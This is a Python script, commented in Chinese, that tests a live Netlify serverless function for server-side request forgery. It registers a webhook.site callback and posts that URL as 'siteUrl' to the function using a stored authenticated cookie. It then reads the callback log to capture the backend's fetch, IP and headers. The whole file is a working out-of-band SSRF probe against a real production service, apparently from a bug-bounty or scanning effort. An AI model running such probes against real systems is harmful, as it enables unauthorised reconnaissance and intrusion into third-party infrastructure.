# -*- coding: utf-8 -*-
"""SSRF 出站回调验证:webhook.site 记录后端是否 fetch 用户提供的 siteUrl
1. POST https://webhook.site/token 创建 token
2. 发给 fetch-extension-host-site-sdk-version
3. GET /token/{id}/requests 看请求(路径/头)"""
import http.client, ssl, gzip, brotli, json, sys, time, urllib.request
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A

ctx = ssl.create_default_context()

# 1. 创建 webhook
req = urllib.request.Request('https://webhook.site/token', method='POST')
req.add_header('Content-Type', 'application/json')
req.add_header('Accept', 'application/json')
try:
    with urllib.request.urlopen(req, timeout=20) as r:
        tk = json.loads(r.read().decode())
        uuid = tk['uuid']
        print('webhook uuid:', uuid)
except Exception as e:
    print('webhook create fail:', e)
    sys.exit(1)

wh_url = 'https://webhook.site/%s' % uuid

# 2. 发给目标 function
def post(site_url):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=35)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    t0 = time.time()
    conn.request('POST', '/.netlify/functions/fetch-extension-host-site-sdk-version',
                 body=json.dumps({'siteUrl': site_url}).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:300].decode('utf-8', 'ignore')
    dt = time.time() - t0
    conn.close()
    return st, dt, out

for label, u in [
    ('https webhook', wh_url),
    ('http webhook ', wh_url.replace('https://', 'http://')),
]:
    st, dt, out = post(u)
    print('%-14s [%d] %5.1fs %s' % (label, st, dt, out))

time.sleep(2)

# 3. 查看请求记录
req = urllib.request.Request('https://webhook.site/token/%s/requests?sorting=newest' % uuid)
req.add_header('Accept', 'application/json')
try:
    with urllib.request.urlopen(req, timeout=20) as r:
        data = json.loads(r.read().decode())
    reqs = data.get('data', [])
    print('\n== 收到的回调请求: %d 个 ==' % len(reqs))
    for it in reqs[:10]:
        print('---')
        print('method:', it.get('method'), '| url:', it.get('url'))
        print('headers:', json.dumps(it.get('headers', {}), indent=0)[:800])
        print('ip:', it.get('ip'), '| origin:', it.get('origin'))
except Exception as e:
    print('query fail:', e)
